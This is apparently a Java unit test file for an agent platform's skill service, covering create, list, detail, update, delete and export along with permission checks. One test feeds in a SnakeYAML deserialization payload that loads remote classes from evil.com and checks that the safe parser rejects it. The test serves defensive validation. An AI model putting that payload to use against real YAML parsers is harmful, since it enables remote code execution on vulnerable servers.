package com.agentplatform.asset.service;

import com.agentplatform.asset.converter.SkillConverter;
import com.agentplatform.asset.dto.*;
import com.agentplatform.asset.entity.SkillEntity;
import com.agentplatform.asset.mapper.SkillMapper;
import com.agentplatform.common.core.error.BizException;
import com.agentplatform.common.core.error.ErrorCode;
import com.agentplatform.common.core.response.PageResult;
import com.agentplatform.common.core.security.AssetRef;
import com.agentplatform.common.core.security.Permission;
import com.agentplatform.common.core.security.PermissionChecker;
import com.agentplatform.common.mybatis.entity.AssetReferenceEntity;
import com.agentplatform.common.mybatis.mapper.AssetReferenceMapper;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.ArgumentCaptor;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;

import java.time.OffsetDateTime;
import java.util.*;

import static org.assertj.core.api.Assertions.*;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.*;

@ExtendWith(MockitoExtension.class)
class SkillCrudTest {

    @Mock private SkillMapper skillMapper;
    @Mock private SkillConverter skillConverter;
    @Mock private AssetReferenceMapper assetReferenceMapper;
    @Mock private PermissionChecker permissionChecker;

    private SkillService skillService;

    private static final UUID USER_A = UUID.fromString("11111111-1111-1111-1111-111111111111");
    private static final UUID SKILL_ID = UUID.fromString("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa");

    @BeforeEach
    void setUp() {
        skillService = new SkillService(skillMapper, skillConverter, assetReferenceMapper, permissionChecker);
    }

    // ───────── Create ─────────

    @Nested
    @DisplayName("Create Skill")
    class CreateTests {

        @Test
        @DisplayName("valid YAML format creates skill with draft status")
        void create_validYaml() {
            SkillCreateRequest request = new SkillCreateRequest();
            request.setName("Test Skill");
            request.setFormat("yaml");
            request.setContent("name: test\ndescription: hello");

            SkillEntity entity = buildSkillEntity("Test Skill", "draft");
            when(skillConverter.toEntity(request)).thenReturn(entity);
            when(skillMapper.insert(any(SkillEntity.class))).thenAnswer(inv -> {
                SkillEntity e = inv.getArgument(0);
                e.setId(SKILL_ID);
                e.setVersion(0L);
                e.setCreatedAt(OffsetDateTime.now());
                e.setUpdatedAt(OffsetDateTime.now());
                return 1;
            });
            when(skillMapper.selectById(SKILL_ID)).thenReturn(entity);

            SkillDetailVO mockVo = new SkillDetailVO();
            mockVo.setName("Test Skill");
            when(skillConverter.toDetailVO(any(SkillEntity.class))).thenReturn(mockVo);

            SkillDetailVO result = skillService.create(request, USER_A);

            assertThat(result.getName()).isEqualTo("Test Skill");

            ArgumentCaptor<SkillEntity> captor = ArgumentCaptor.forClass(SkillEntity.class);
            verify(skillMapper).insert(captor.capture());
            assertThat(captor.getValue().getStatus()).isEqualTo("draft");
            assertThat(captor.getValue().getVisibility()).isEqualTo("private");
        }

        @Test
        @DisplayName("invalid YAML content throws INVALID_REQUEST")
        void create_invalidYaml() {
            SkillCreateRequest request = new SkillCreateRequest();
            request.setName("Bad YAML");
            request.setFormat("yaml");
            request.setContent(": invalid yaml ::: {{");

            assertThatThrownBy(() -> skillService.create(request, USER_A))
                    .isInstanceOf(BizException.class)
                    .extracting(e -> ((BizException) e).getErrorCode())
                    .isEqualTo(ErrorCode.INVALID_REQUEST);
        }

        @Test
        @DisplayName("YAML attack payload (!!java) is rejected by SafeConstructor")
        void create_yamlAttackPayload_rejected() {
            SkillCreateRequest request = new SkillCreateRequest();
            request.setName("Attack Skill");
            request.setFormat("yaml");
            request.setContent("!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://evil.com\"]]]]");

            assertThatThrownBy(() -> skillService.create(request, USER_A))
                    .isInstanceOf(BizException.class)
                    .extracting(e -> ((BizException) e).getErrorCode())
                    .isEqualTo(ErrorCode.INVALID_REQUEST);
        }

        @Test
        @DisplayName("markdown format creates without YAML validation")
        void create_markdown() {
            SkillCreateRequest request = new SkillCreateRequest();
            request.setName("Markdown Skill");
            request.setFormat("markdown");
            request.setContent("# Heading\n\nSome content");

            SkillEntity entity = buildSkillEntity("Markdown Skill", "draft");
            when(skillConverter.toEntity(request)).thenReturn(entity);
            when(skillMapper.insert(any(SkillEntity.class))).thenAnswer(inv -> {
                SkillEntity e = inv.getArgument(0);
                e.setId(SKILL_ID);
                e.setVersion(0L);
                e.setCreatedAt(OffsetDateTime.now());
                e.setUpdatedAt(OffsetDateTime.now());
                return 1;
            });
            when(skillMapper.selectById(SKILL_ID)).thenReturn(entity);

            SkillDetailVO mockVo = new SkillDetailVO();
            mockVo.setName("Markdown Skill");
            when(skillConverter.toDetailVO(any(SkillEntity.class))).thenReturn(mockVo);

            SkillDetailVO result = skillService.create(request, USER_A);

            assertThat(result.getName()).isEqualTo("Markdown Skill");
            verify(skillMapper).insert(any(SkillEntity.class));
        }
    }

    // ───────── List ─────────

    @Nested
    @DisplayName("List Skills")
    class ListTests {

        @Test
        @DisplayName("returns paginated results")
        void list_paginated() {
            SkillEntity entity = buildSkillEntity("My Skill", "draft");
            when(skillMapper.selectPage(any(), any())).thenAnswer(inv -> {
                com.baomidou.mybatisplus.core.metadata.IPage<SkillEntity> page = inv.getArgument(0);
                page.setRecords(List.of(entity));
                page.setTotal(1);
                return page;
            });

            SkillSummaryVO mockVo = new SkillSummaryVO();
            mockVo.setName("My Skill");
            when(skillConverter.toSummaryVO(entity)).thenReturn(mockVo);

            PageResult<SkillSummaryVO> result = skillService.list(USER_A, null, 1, 20, "updated_at", "desc");

            assertThat(result.data()).hasSize(1);
            assertThat(result.total()).isEqualTo(1);
            assertThat(result.data().get(0).getName()).isEqualTo("My Skill");
        }

        @Test
        @DisplayName("search filters by name or description")
        void list_search() {
            SkillEntity entity = buildSkillEntity("Search Hit", "draft");
            @SuppressWarnings("unchecked")
            ArgumentCaptor<com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper<SkillEntity>> captor =
                    ArgumentCaptor.forClass(com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper.class);
            when(skillMapper.selectPage(any(), captor.capture())).thenAnswer(inv -> {
                com.baomidou.mybatisplus.core.metadata.IPage<SkillEntity> page = inv.getArgument(0);
                page.setRecords(List.of(entity));
                page.setTotal(1);
                return page;
            });

            SkillSummaryVO mockVo = new SkillSummaryVO();
            mockVo.setName("Search Hit");
            when(skillConverter.toSummaryVO(entity)).thenReturn(mockVo);

            PageResult<SkillSummaryVO> result = skillService.list(USER_A, "Search", 1, 20, "updated_at", "desc");

            assertThat(result.data()).hasSize(1);
            assertThat(captor.getValue()).isNotNull();
        }

        @Test
        @DisplayName("empty search returns all")
        void list_emptySearch() {
            SkillEntity e1 = buildSkillEntity("Skill A", "draft");
            SkillEntity e2 = buildSkillEntity("Skill B", "published");
            when(skillMapper.selectPage(any(), any())).thenAnswer(inv -> {
                com.baomidou.mybatisplus.core.metadata.IPage<SkillEntity> page = inv.getArgument(0);
                page.setRecords(List.of(e1, e2));
                page.setTotal(2);
                return page;
            });

            SkillSummaryVO vo1 = new SkillSummaryVO();
            vo1.setName("Skill A");
            SkillSummaryVO vo2 = new SkillSummaryVO();
            vo2.setName("Skill B");
            when(skillConverter.toSummaryVO(e1)).thenReturn(vo1);
            when(skillConverter.toSummaryVO(e2)).thenReturn(vo2);

            PageResult<SkillSummaryVO> result = skillService.list(USER_A, null, 1, 20, "updated_at", "desc");

            assertThat(result.data()).hasSize(2);
        }
    }

    // ───────── GetDetail ─────────

    @Nested
    @DisplayName("Get Skill Detail")
    class GetDetailTests {

        @Test
        @DisplayName("returns detail for valid skill with permission check")
        void getDetail_success() {
            SkillEntity entity = buildSkillEntity("Detail Skill", "published");
            when(skillMapper.selectById(SKILL_ID)).thenReturn(entity);

            SkillDetailVO mockVo = new SkillDetailVO();
            mockVo.setName("Detail Skill");
            when(skillConverter.toDetailVO(entity)).thenReturn(mockVo);

            SkillDetailVO result = skillService.getDetail(SKILL_ID, USER_A);

            assertThat(result.getName()).isEqualTo("Detail Skill");
            verify(permissionChecker).checkAccess(eq(USER_A), any(AssetRef.class), eq(Permission.READ));
        }

        @Test
        @DisplayName("throws ASSET_NOT_FOUND for missing skill")
        void getDetail_notFound() {
            when(skillMapper.selectById(SKILL_ID)).thenReturn(null);

            assertThatThrownBy(() -> skillService.getDetail(SKILL_ID, USER_A))
                    .isInstanceOf(BizException.class)
                    .extracting(e -> ((BizException) e).getErrorCode())
                    .isEqualTo(ErrorCode.ASSET_NOT_FOUND);
        }
    }

    // ───────── Update ─────────

    @Nested
    @DisplayName("Update Skill")
    class UpdateTests {

        @Test
        @DisplayName("partial update succeeds")
        void update_partialFields() {
            SkillEntity entity = buildSkillEntity("Old Name", "draft");
            entity.setVersion(1L);
            entity.setContent("name: old");
            when(skillMapper.selectById(SKILL_ID)).thenReturn(entity);
            when(skillMapper.updateById(any(SkillEntity.class))).thenReturn(1);

            SkillDetailVO mockVo = new SkillDetailVO();
            mockVo.setName("New Name");
            when(skillConverter.toDetailVO(any(SkillEntity.class))).thenReturn(mockVo);

            SkillUpdateRequest request = new SkillUpdateRequest();
            request.setName("New Name");
            request.setVersion(1L);

            SkillDetailVO result = skillService.update(SKILL_ID, request, USER_A);

            assertThat(result.getName()).isEqualTo("New Name");
            verify(permissionChecker).checkAccess(eq(USER_A), any(AssetRef.class), eq(Permission.WRITE));

            ArgumentCaptor<SkillEntity> captor = ArgumentCaptor.forClass(SkillEntity.class);
            verify(skillMapper).updateById(captor.capture());
            assertThat(captor.getValue().getName()).isEqualTo("New Name");
        }

        @Test
        @DisplayName("optimistic lock conflict throws ASSET_OPTIMISTIC_LOCK")
        void update_optimisticLock() {
            SkillEntity entity = buildSkillEntity("Old Name", "draft");
            entity.setVersion(5L);
            when(skillMapper.selectById(SKILL_ID)).thenReturn(entity);

            SkillUpdateRequest request = new SkillUpdateRequest();
            request.setName("New Name");
            request.setVersion(3L); // stale

            assertThatThrownBy(() -> skillService.update(SKILL_ID, request, USER_A))
                    .isInstanceOf(BizException.class)
                    .extracting(e -> ((BizException) e).getErrorCode())
                    .isEqualTo(ErrorCode.ASSET_OPTIMISTIC_LOCK);
        }

        @Test
        @DisplayName("DB-level optimistic lock failure when updateById returns 0")
        void update_dbOptimisticLock() {
            SkillEntity entity = buildSkillEntity("Concurrent Edit", "draft");
            entity.setVersion(3L);
            entity.setContent("name: original");
            when(skillMapper.selectById(SKILL_ID)).thenReturn(entity);
            when(skillMapper.updateById(any(SkillEntity.class))).thenReturn(0);

            SkillUpdateRequest request = new SkillUpdateRequest();
            request.setName("Concurrent Edit");
            request.setVersion(3L);

            assertThatThrownBy(() -> skillService.update(SKILL_ID, request, USER_A))
                    .isInstanceOf(BizException.class)
                    .extracting(e -> ((BizException) e).getErrorCode())
                    .isEqualTo(ErrorCode.ASSET_OPTIMISTIC_LOCK);
        }

        @Test
        @DisplayName("published skill gets hasUnpublishedChanges=true on update")
        void update_publishedSkill_marksUnpublishedChanges() {
            SkillEntity entity = buildSkillEntity("Published Skill", "published");
            entity.setVersion(2L);
            entity.setContent("name: old");
            when(skillMapper.selectById(SKILL_ID)).thenReturn(entity);
            when(skillMapper.updateById(any(SkillEntity.class))).thenReturn(1);

            SkillDetailVO mockVo = new SkillDetailVO();
            mockVo.setName("Updated Published");
            when(skillConverter.toDetailVO(any(SkillEntity.class))).thenReturn(mockVo);

            SkillUpdateRequest request = new SkillUpdateRequest();
            request.setName("Updated Published");
            request.setVersion(2L);

            skillService.update(SKILL_ID, request, USER_A);

            ArgumentCaptor<SkillEntity> captor = ArgumentCaptor.forClass(SkillEntity.class);
            verify(skillMapper).updateById(captor.capture());
            assertThat(captor.getValue().getHasUnpublishedChanges()).isTrue();
        }

        @Test
        @DisplayName("update with invalid YAML content throws INVALID_REQUEST")
        void update_invalidYamlContent() {
            SkillEntity entity = buildSkillEntity("YAML Skill", "draft");
            entity.setVersion(0L);
            entity.setFormat("yaml");
            entity.setContent("old: content");
            when(skillMapper.selectById(SKILL_ID)).thenReturn(entity);

            SkillUpdateRequest request = new SkillUpdateRequest();
            request.setContent(": invalid yaml ::: {{");
            request.setVersion(0L);

            assertThatThrownBy(() -> skillService.update(SKILL_ID, request, USER_A))
                    .isInstanceOf(BizException.class)
                    .extracting(e -> ((BizException) e).getErrorCode())
                    .isEqualTo(ErrorCode.INVALID_REQUEST);
        }
    }

    // ───────── Delete ─────────

    @Nested
    @DisplayName("Delete Skill")
    class DeleteTests {

        @Test
        @DisplayName("deletes skill without dependencies")
        void delete_noDependencies() {
            SkillEntity entity = buildSkillEntity("To Delete", "draft");
            when(skillMapper.selectById(SKILL_ID)).thenReturn(entity);
            when(assetReferenceMapper.selectList(any())).thenReturn(List.of());
            when(skillMapper.deleteById(SKILL_ID)).thenReturn(1);

            assertThatCode(() -> skillService.delete(SKILL_ID, USER_A, false))
                    .doesNotThrowAnyException();

            verify(permissionChecker).checkAccess(eq(USER_A), any(AssetRef.class), eq(Permission.DELETE));
            verify(skillMapper).deleteById(SKILL_ID);
        }

        @Test
        @DisplayName("throws ASSET_DELETE_CONFLICT when skill is referenced by agents")
        void delete_conflict() {
            SkillEntity entity = buildSkillEntity("Referenced Skill", "published");
            when(skillMapper.selectById(SKILL_ID)).thenReturn(entity);

            AssetReferenceEntity dep = new AssetReferenceEntity();
            dep.setReferrerType("agent");
            dep.setReferrerId(UUID.randomUUID());
            dep.setRefereeType("skill");
            dep.setRefereeId(SKILL_ID);
            dep.setRefKind("skill");
            when(assetReferenceMapper.selectList(any())).thenReturn(List.of(dep));

            assertThatThrownBy(() -> skillService.delete(SKILL_ID, USER_A, false))
                    .isInstanceOf(BizException.class)
                    .satisfies(e -> {
                        BizException biz = (BizException) e;
                        assertThat(biz.getErrorCode()).isEqualTo(ErrorCode.ASSET_DELETE_CONFLICT);
                        assertThat(biz.getDetails()).containsKey("referrer_ids");
                    });
        }

        @Test
        @DisplayName("force delete unbinds references and soft-deletes")
        void delete_force() {
            SkillEntity entity = buildSkillEntity("Force Delete", "draft");
            when(skillMapper.selectById(SKILL_ID)).thenReturn(entity);

            AssetReferenceEntity dep = new AssetReferenceEntity();
            dep.setReferrerType("agent");
            dep.setReferrerId(UUID.randomUUID());
            dep.setRefereeType("skill");
            dep.setRefereeId(SKILL_ID);
            dep.setRefKind("skill");
            when(assetReferenceMapper.selectList(any())).thenReturn(List.of(dep));
            when(assetReferenceMapper.delete(any())).thenReturn(1);
            when(skillMapper.deleteById(SKILL_ID)).thenReturn(1);

            assertThatCode(() -> skillService.delete(SKILL_ID, USER_A, true))
                    .doesNotThrowAnyException();

            verify(assetReferenceMapper).delete(any());
            verify(skillMapper).deleteById(SKILL_ID);
        }

        @Test
        @DisplayName("throws ASSET_NOT_FOUND for nonexistent skill")
        void delete_notFound() {
            when(skillMapper.selectById(SKILL_ID)).thenReturn(null);

            assertThatThrownBy(() -> skillService.delete(SKILL_ID, USER_A, false))
                    .isInstanceOf(BizException.class)
                    .extracting(e -> ((BizException) e).getErrorCode())
                    .isEqualTo(ErrorCode.ASSET_NOT_FOUND);
        }
    }

    // ───────── Export ─────────

    @Nested
    @DisplayName("Export Skill")
    class ExportTests {

        @Test
        @DisplayName("exports skill as JSON map")
        void export_success() {
            SkillEntity entity = buildSkillEntity("Export Skill", "published");
            entity.setDescription("A skill for export");
            entity.setFormat("yaml");
            entity.setContent("name: skill");
            entity.setTriggerConditions("{\"type\":\"keyword\"}");
            entity.setCurrentVersion("v1.2.0");
            when(skillMapper.selectById(SKILL_ID)).thenReturn(entity);

            Map<String, Object> result = skillService.export(SKILL_ID, USER_A);

            assertThat(result).containsEntry("name", "Export Skill");
            assertThat(result).containsEntry("description", "A skill for export");
            assertThat(result).containsEntry("format", "yaml");
            assertThat(result).containsEntry("content", "name: skill");
            assertThat(result).containsEntry("current_version", "v1.2.0");
            verify(permissionChecker).checkAccess(eq(USER_A), any(AssetRef.class), eq(Permission.READ));
        }

        @Test
        @DisplayName("throws ASSET_NOT_FOUND for nonexistent skill")
        void export_notFound() {
            when(skillMapper.selectById(SKILL_ID)).thenReturn(null);

            assertThatThrownBy(() -> skillService.export(SKILL_ID, USER_A))
                    .isInstanceOf(BizException.class)
                    .extracting(e -> ((BizException) e).getErrorCode())
                    .isEqualTo(ErrorCode.ASSET_NOT_FOUND);
        }
    }

    // ─── helpers ───

    private SkillEntity buildSkillEntity(String name, String status) {
        SkillEntity entity = new SkillEntity();
        entity.setId(SKILL_ID);
        entity.setOwnerId(USER_A);
        entity.setName(name);
        entity.setDescription(name + " description");
        entity.setFormat("yaml");
        entity.setContent("name: test");
        entity.setStatus(status);
        entity.setVisibility("private");
        entity.setCurrentVersion("v1.0.0");
        entity.setHasUnpublishedChanges(false);
        entity.setVersion(0L);
        entity.setCreatedAt(OffsetDateTime.now());
        entity.setUpdatedAt(OffsetDateTime.now());
        return entity;
    }
}
